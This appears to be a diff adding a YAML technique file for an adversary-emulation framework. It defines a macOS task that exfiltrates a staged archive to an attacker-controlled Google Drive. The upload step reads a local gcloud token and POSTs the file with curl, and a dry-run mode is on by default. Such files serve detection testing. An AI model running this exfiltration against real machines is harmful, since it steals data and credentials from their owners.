@@ -1,0 +1,127 @@
+id: 012-upload-google-drive
+name: Upload to Google Drive
+description: Exfiltrates data by uploading files to attacker-controlled Google Drive
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: f2a3b4c5-d6e7-4f80-9091-a2b3c4d5e6f7
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to upload
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  drive_folder_id:
+    description: Google Drive folder ID
+    type: string
+    default: "1a2B3c4D5e6F7g8H9i0J"
+  drive_api_key:
+    description: Google Drive API key
+    type: string
+    default: "AIzaSyD..."
+  file_description:
+    description: File description in Drive
+    type: string
+    default: "Exfiltrated data"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Check Google Drive access
+    type: command
+    executor: bash
+    command: |
+      echo "Google Drive Configuration:"
+      echo "  Folder ID: {{ args.drive_folder_id }}"
+      echo "  File: $(basename '{{ args.file_path }}')"
+      echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+    cleanup: false
+  
+  - name: Prepare upload metadata
+    type: command
+    executor: bash
+    command: |
+      cat > /tmp/drive_metadata.json << 'JSON_EOF'
+{
+  "name": "$(basename '{{ args.file_path }}')",
+  "description": "{{ args.file_description }}",
+  "parents": ["{{ args.drive_folder_id }}"],
+  "mimeType": "application/octet-stream"
+}
+JSON_EOF
+      echo "Upload metadata prepared"
+    cleanup: false
+  
+  - name: Execute Google Drive upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Google Drive Upload"
+        echo "Endpoint: https://www.googleapis.com/upload/drive/v3/files"
+        echo "Method: POST (multipart/related)"
+        echo "File: $(basename '{{ args.file_path }}')"
+        echo "Folder ID: {{ args.drive_folder_id }}"
+      else
+        curl -X POST \
+          -H "Authorization: Bearer $(cat ~/.config/gcloud/token 2>/dev/null || echo 'TOKEN')" \
+          -F "metadata=@/tmp/drive_metadata.json;type=application/json" \
+          -F "file=@'{{ args.file_path }}'" \
+          "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
+      fi
+    cleanup: false
+checks:
+  - name: File accessible
+    description: Verify file is readable
+    type: command
+    command: test -r '{{ args.file_path }}'
+  
+  - name: Valid folder ID
+    description: Verify Google Drive folder ID format
+    type: command
+    command: echo '{{ args.drive_folder_id }}' | grep -qE '^[a-zA-Z0-9_-]+$' && echo "Valid folder ID"
+tests:
+  dry_run:
+    - name: Test Google Drive upload (dry-run)
+      description: Test Drive upload without actual request
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Google Drive test data" > /tmp/test_drive.dat
+        
+        - name: Prepare metadata
+          type: command
+          executor: bash
+          command: |
+            cat > /tmp/drive_meta.json << 'JSON'
+{
+  "name": "test_drive.dat",
+  "parents": ["1a2B3c4D5e6F7g8H9i0J"]
+}
+JSON
+        
+        - name: Show upload preparation
+          type: command
+          executor: bash
+          command: |
+            echo "Google Drive Upload Simulation:"
+            echo "File: test_drive.dat"
+            echo "Metadata: $(cat /tmp/drive_meta.json)"
+cleanup:
+  - name: Remove test files
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_drive.dat /tmp/drive_meta.json /tmp/drive_metadata.json
+    ignore_errors: true
